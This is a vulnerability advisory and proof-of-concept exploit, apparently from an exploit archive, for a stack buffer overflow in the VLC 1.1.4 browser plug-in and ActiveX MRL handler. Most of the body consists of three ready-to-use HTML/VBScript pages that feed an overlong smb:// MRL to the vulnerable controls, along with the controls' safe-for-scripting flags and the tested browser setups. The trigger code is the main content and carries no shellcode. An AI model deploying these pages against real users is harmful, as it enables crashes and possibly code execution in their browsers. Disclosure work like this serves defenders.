@@ -1,0 +1,94 @@
+source: http://www.securityfocus.com/bid/44909/info
+
+VLC Media Player is prone to a remote stack-based buffer-overflow vulnerability because it fails to perform adequate boundary checks on user-supplied data.
+
+Attackers could exploit this issue to execute arbitrary code in the context of the affected application. Failed exploit attempts will likely cause denial-of-service conditions.
+
+Versions prior to VLC Media Player 1.1.5 for Windows are vulnerable. 
+
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+========================================================================================================================
+========================================================================================================================
+ VLC Multimedia Plug-in and/or Activex 1.1.4 MRL handler remote buffer overflow
+
+ Author: shinnai
+ mail: shinnai[at]autistici[dot]org
+ site: http://www.shinnai.altervista.org/
+
+ This was written for educational purpose. Use it at your own risk.
+ Author will be not responsible for any damage.
+
+ Note that the activex {9BE31822-FDAD-461B-AD51-BE1D1C159921} is marked as follow:
+ 
+ RegKey Safe for Script: True
+ RegKey Safe for Init: True
+ Implements IObjectSafety: True
+ IDisp Safe: Safe for untrusted: caller,data
+ IPersist Safe: Safe for untrusted: caller,data
+ IPStorage Safe: Safe for untrusted: caller,data
+
+ ***
+
+ Note that the activex {E23FE9C6-778E-49D4-B537-38FCDE4887D8} is marked as follow:
+
+ RegKey Safe for Script: True
+ RegKey Safe for Init: True
+ Implements IObjectSafety: True
+ IDisp Safe: Safe for untrusted: caller,data
+ IPersist Safe: Safe for untrusted: caller,data
+ IPStorage Safe: Safe for untrusted: caller,data
+
+ Tested on:
+ Windows 7 professional full patched against Firefox 3.6.11
+ Windows 7 professional full patched against Internet Explorer 8
+========================================================================================================================
+========================================================================================================================
+ Plug-in Version:
+
+ <html>  
+  <embed type="application/x-vlc-plugin" MRL="smb://Something.com@www.Something.com/#{aaaaaaaaaaaaaaaaaaaaaa}"></embed>
+ </html>
+========================================================================================================================
+========================================================================================================================
+ Activex {9BE31822-FDAD-461B-AD51-BE1D1C159921} version:
+
+ <html>
+  <object classid='clsid:9BE31822-FDAD-461B-AD51-BE1D1C159921' id='test'></object>
+  <script language = 'vbscript'>
+   buff = String(500, "A")
+   test.MRL = "smb://Something.com@www.Something.com/#{" & buff & "}"
+  </script>
+ </html>
+========================================================================================================================
+========================================================================================================================
+ Activex {E23FE9C6-778E-49D4-B537-38FCDE4887D8} version:
+
+ <html>
+  <object classid='clsid:E23FE9C6-778E-49D4-B537-38FCDE4887D8' id='test'></object>
+  <script language = 'vbscript'>
+   buff = String(500, "A")
+   test.MRL = "smb://Something.com@www.Something.com/#{" & buff & "}"
+  </script>
+ </html>
+========================================================================================================================
+========================================================================================================================
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.10 (MingW32)
+
+iQIcBAEBAgAGBQJMxpYiAAoJELleC2c7YdP1asMQALE8uuLZovZA9S7d2uwRJp3d
+SrvQgKggqyQZ1z7ymDOzo74EGwHJVfSs/ix/xvE5lkYqlY31bEbsjHtqGRsKr0I0
+x12GGdW7JTxCiq/Fw2zLpjzE3xNpOwaFs+OR3BWuw1G6e9r1jooqlnN5mSTBEVlp
+2y113XK2mo85S5cEYDTTm/YFHqrMF1Jy21eXLRfHs+13E2FPGM8viyCacTf02W8P
+4VF2s4vVDC5mreqX/Rlts7roouHCZLJRaoFMyl5xcgv+BqGSOGIe9dLcUz18wwtJ
+c8i1+ZGTbYmdfOAL8Kkexy96/lWfeewJBiA8s12qkzrm7xtjdpyt+cJdCelThEQP
+/RVHLBmh7n03CzgCHG06DKfPnBtPgQquqFtMrYOsSZPJDNwGQEg1orZgcfpe9yVi
+8LWbrKpAe0ay8gCF2o//wdJ6ht8Uuqn1LuXShVgPU1kBrQaNw7k+x6y0Xd0PxW3m
+rFQQjsOzlrTbtw7SDCaPxxCwgIBWr4bekmfcIE4xiTBIVKAhT4AbfBG5H4zxTMpv
+g5CJ6qifs3Zfb1sgQb6KKT+7j+4zZIcm0AA3L/8DjESYId8WiI/26eDn2/pX8hx0
+p5JxomSSkLHoO/alMUw4mR+4Rz9YhIuPZz7t6DiV21xn+xgBavRdT2Ztc9jA7yP1
+QBQRi/NSST3Gxu5ZaJXx
+=2VZk
+-----END PGP SIGNATURE-----
